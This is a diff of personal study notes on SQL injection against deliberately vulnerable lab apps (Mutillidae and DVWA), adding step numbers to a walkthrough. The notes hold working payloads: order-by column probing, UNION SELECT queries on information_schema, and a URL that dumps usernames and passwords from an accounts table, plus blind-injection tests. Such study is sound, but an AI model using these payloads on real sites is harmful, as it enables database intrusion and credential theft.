@@ -381,7 +381,7 @@ index.php?page=user-info.php&username=Sadanand' order by 1%23&password=123456&us
 now if we replace the above section like Sadanand' order by 100000# // now chances r their is no column with 10000 so this should
 return the DB error
 
-Reading Database Information ->
+Step 7 -> Reading Database Information -
 Now lets check the number of columns could be their in DB so we use above method as Sadanand' order by 10# which returns error 
 but by -> Sadanand' order by 5# it shows no error and this way we find the no. of columns which is at current 5
 
@@ -407,9 +407,9 @@ Signature=5.0.51a-3ubuntu5 // this is no. 4 so this is version
 
 we r using 2, 3, 4 places only bcz the returned data for the no. 1 and 5 would not be displayed over the website
 
-Usualy in real life scenerios each database is assigned to a certain user So usally u only get data in that current database
+Usualy in real life scenerios each database is assigned to a certain user, So usally u only get data in that current database
 
-Finding Database Tables ->
+Step 8 -> Finding Database Tables -
 As now we know that our target database is owasp10 so lets modify the sql statement again like this
 union select 1,table_name,null,null,5 from information_schema.tables // here we r selecting table from tables from DB
 information_schema and column we r selecting is table_name
@@ -419,15 +419,14 @@ index.php?page=user-info.php&username=Sadanand' union select 1,table_name,null,n
 Now u will see that the tables records we have and we can even see the tables from other web applications also // but is real life
 scenerios u will only see the tables from current database
 
-Now we change the statement again like this ->
+Step 9 -> Now we change the statement again like this -
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10' and change the URL according to
 it like this ->
 index.php?page=user-info.php&username=Sadanand' union select 1,table_name,null,null,5 from information_schema.tables where 
 table_schema = 'owasp10'%23&password=123456&user-info-php-submit-button=View+Account+Details
+O/P -> now we will get tables related to owasp10
 
-// and now we will get tables related to owasp10
-
-Extracting Sensitive data such as Passwords ->
+Step 10 -> Extracting Sensitive data such as Passwords -
 Now we need to know the columns in accounts in owasp10 so we change the statement as like this ->
 union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts' and change URL like ->
 index.php?page=user-info.php&username=Sadanand' union select 1,column_name,null,null,5 from information_schema.columns where 
@@ -440,6 +439,7 @@ index.php?page=user-info.php&username=Sadanand' union select 1,username,password
 123456&user-info-php-submit-button=View+Account+Details
 // now we will see the all usernames, passwords and their admin types
 
+Step 11 ->
 How to Discover and Exploit blind SQL injections-> In the Blind SQL injections it will not show errors to us but this does not 
 means that website is not vurnelable, In real life we most of the times encounter blind SQL Injections
 
@@ -464,6 +464,7 @@ Now lets try we false statement like this -> 1' order by 10000000# and inject it
 10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' order by 10000000%23&Submit=Submit#
 // now u will see it does not return default valid page without any error also // but we get to know that this is invalid page
 
+Step 12 ->
 this concludes that the website is vulnerable even though it is not showing any errors about sql
 So we exploit it by using statement -> 1' union select 1,2 and inject it in URL like this
 10.0.2.4/dvwa/vulnerabilities/sqli_blind/?id=1' union select 1,2%23&Submit=Submit#
@@ -476,7 +477,7 @@ Now u see we see records returned according to query
 
 So never just reply on single quote usage try to use 1=1 or order by to discover vurnebilities
 
-Discovering more complicated sql injection ->
+Step 13 -> Discovering more complicated sql injection -
 Go to DVWA app and then to security level as low then go to sql injection
 - put 1 in input box and u will get the result according to that
 - now try with true statement in input box as -> 1' and 1=1 # // this result is a valid page
